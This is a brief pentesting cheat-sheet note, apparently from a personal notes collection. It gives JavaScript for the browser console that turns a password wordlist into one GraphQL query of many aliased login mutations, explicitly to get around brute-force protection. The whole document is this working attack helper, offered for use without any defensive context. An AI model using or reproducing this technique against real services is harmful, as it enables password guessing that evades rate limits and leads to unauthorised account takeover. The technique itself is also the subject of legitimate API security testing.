# GRAPHQL ALIASES

## Bypass bruteforce with large querry of aliases
```
Javascript use in browser console
Add list of words in words string and modify Query

For seperation on comma
copy(`words`.split(',').map((element,index)=>`
login$index:login(input:{username: "name",password: "$password"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));


### For seperation on Newlines
copy(`words`.split(/\r?\n/).map((element,index)=>`
login$index:login(input:{username: "name",password: "$password"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));
```